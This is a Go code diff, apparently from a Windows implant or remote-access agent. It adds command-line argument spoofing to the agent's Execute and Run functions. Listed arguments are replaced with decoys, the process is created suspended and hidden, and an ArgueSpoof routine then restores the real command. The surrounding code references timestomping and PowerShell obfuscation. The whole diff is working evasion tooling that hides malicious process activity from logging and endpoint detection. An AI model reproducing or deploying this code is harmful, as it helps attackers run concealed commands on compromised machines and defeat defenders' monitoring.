@@ -14,6 +14,7 @@ import (
 	"main/util"
 	"net"
 	"os"
+	"strings"
 	"time"
 	//"runtime"
 	"strconv"
@@ -21,8 +22,8 @@ import (
 	"unsafe"
 )
 
-func Shell(path string, args []byte, Token uintptr) ([]byte, error) {
-	return Run(append([]byte(path), args...), Token)
+func Shell(path string, args []byte, Token uintptr, argues map[string]string) ([]byte, error) {
+	return Run(append([]byte(path), args...), Token, argues)
 }
 
 func TimeStomp(from []byte, to []byte) ([]byte, error) {
@@ -52,12 +53,28 @@ func TimeStomp(from []byte, to []byte) ([]byte, error) {
 	return []byte(fmt.Sprintf("timestomp %s to %s", from, to)), err
 }
 
-func Execute(b []byte, Token uintptr) ([]byte, error) {
+func Execute(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
 	var sI windows.StartupInfo
 	var pI windows.ProcessInformation
+	var status = windows.CREATE_NO_WINDOW
 	sI.ShowWindow = windows.SW_HIDE
 
-	program, _ := syscall.UTF16PtrFromString(string(b))
+	command := string(b)
+	isSpoof := false
+	commands := strings.Split(command, " ")
+	for index, c := range commands {
+		_, exist := argues[c]
+		if exist {
+			isSpoof = true
+			commands[index] = argues[c]
+		}
+	}
+	if isSpoof {
+		status = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
+		command = strings.Join(commands, " ")
+	}
+
+	program, _ := syscall.UTF16PtrFromString(command)
 
 	var err error
 	var result uintptr
@@ -75,7 +92,7 @@ func Execute(b []byte, Token uintptr) ([]byte, error) {
 			LOGON_WITH_PROFILE,
 			uintptr(0),
 			uintptr(unsafe.Pointer(program)),
-			windows.CREATE_NO_WINDOW,
+			uintptr(status),
 			uintptr(0),
 			uintptr(0),
 			uintptr(unsafe.Pointer(&sI)),
@@ -93,13 +110,20 @@ func Execute(b []byte, Token uintptr) ([]byte, error) {
 			nil,
 			nil,
 			true,
-			windows.CREATE_NO_WINDOW,
+			uint32(status),
 			nil,
 			nil,
 			&sI,
 			&pI)
 		if err != nil {
 			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
+		}
+	}
+
+	if isSpoof {
+		err = ArgueSpoof(pI, b)
+		if err != nil {
+			return nil, errors.New("argue spoof failed : " + err.Error())
 		}
 	}
 
@@ -127,10 +151,11 @@ func PowershellObfuscation(b []byte) ([]byte, error) {
 	return append(append(bytes1, command...), bytes2...), nil
 }
 
-func Run(b []byte, Token uintptr) ([]byte, error) {
+func Run(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
 	var (
-		sI windows.StartupInfo
-		pI windows.ProcessInformation
+		sI     windows.StartupInfo
+		pI     windows.ProcessInformation
+		status = windows.CREATE_NO_WINDOW
 
 		hWPipe windows.Handle
 		hRPipe windows.Handle
@@ -160,12 +185,24 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 		b = append([]byte("powershell "), b...)
 	}
 
-	program, _ := windows.UTF16PtrFromString(string(b))
+	command := string(b)
+	isSpoof := false
+	commands := strings.Split(command, " ")
+	for index, c := range commands {
+		_, exist := argues[c]
+		if exist {
+			isSpoof = true
+			commands[index] = argues[c]
+		}
+	}
+	if isSpoof {
+		status = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
+		command = strings.Join(commands, " ")
+	}
 
-	//Token :=GetCurrentProcessToken()
+	program, _ := windows.UTF16PtrFromString(command)
 
 	var result uintptr
-	//fmt.Println(Token)
 	var NewToken windows.Token
 	if Token != 0 {
 
@@ -179,7 +216,7 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 			LOGON_WITH_PROFILE,
 			uintptr(0),
 			uintptr(unsafe.Pointer(program)),
-			windows.CREATE_NO_WINDOW,
+			uintptr(status),
 			uintptr(0),
 			uintptr(0),
 			uintptr(unsafe.Pointer(&sI)),
@@ -197,13 +234,20 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 			nil,
 			nil,
 			true,
-			windows.CREATE_NO_WINDOW,
+			uint32(status),
 			nil,
 			nil,
 			&sI,
 			&pI)
 		if err != nil {
 			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
+		}
+	}
+
+	if isSpoof {
+		err = ArgueSpoof(pI, b)
+		if err != nil {
+			return nil, errors.New("argue spoof failed : " + err.Error())
 		}
 	}
 
